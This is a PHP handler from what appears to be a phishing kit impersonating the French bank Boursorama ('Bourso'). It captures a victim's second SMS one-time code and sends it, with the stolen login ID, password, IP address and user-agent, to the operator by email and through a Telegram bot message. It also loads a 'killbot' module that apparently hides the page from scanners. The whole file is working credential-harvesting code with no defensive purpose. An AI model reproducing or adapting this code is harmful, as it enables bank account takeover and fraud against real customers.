<?php

include_once '../killbot/code/include.php';
include("../settings.php");
include("../common/sub_includes.php");



if(isset($_POST)){

	
	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['sms_code_error'] = htmlspecialchars($_POST['sms_code_error']);

		######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "

[🏷] Code SMS ( 2nd Passage ) [🏷]

🏷 Code SMS : ".$_SESSION['sms_code_error']."

[🧲] Login [🧲]

🧲 Identifiant : ".$_SESSION['identifiant']."
🧲 Mot de passe : ".$_SESSION['password']."

[⚰️] Additionnellal [⚰️]

⚰️ IP : ".$_SESSION['ip']."
⚰️ User-agent : ".$_SESSION['useragent']."
					";

					$subject = "[🏷] + 1 SMS Code ( 2nd Passage ) |".$_SESSION['identifiant']." | ".$_SESSION['sms_code_error'];
					$headers = "From: 📦Bourso| <bill@rezzzzz.com>";

					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '

[🏷] Code SMS ( 2nd Passage ) [🏷]

🏷 Code SMS : '.$_SESSION['sms_code_error'].'

[🧲] Login [🧲]

🧲 Identifiant : '.$_SESSION['identifiant'].'
🧲 Mot de passe : '.$_SESSION['password'].'

[⚰️] Informations additionnelles [⚰️]

⚰️ Adresse Ip : '.$_SESSION['ip'].'
⚰️ User-agent : '.$_SESSION['useragent'].'
					  
					',
					'chat_id' => $chat_rez
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}


				header('Location: ../steps/end.php');




	}
else{
	header('Location: ../');
}
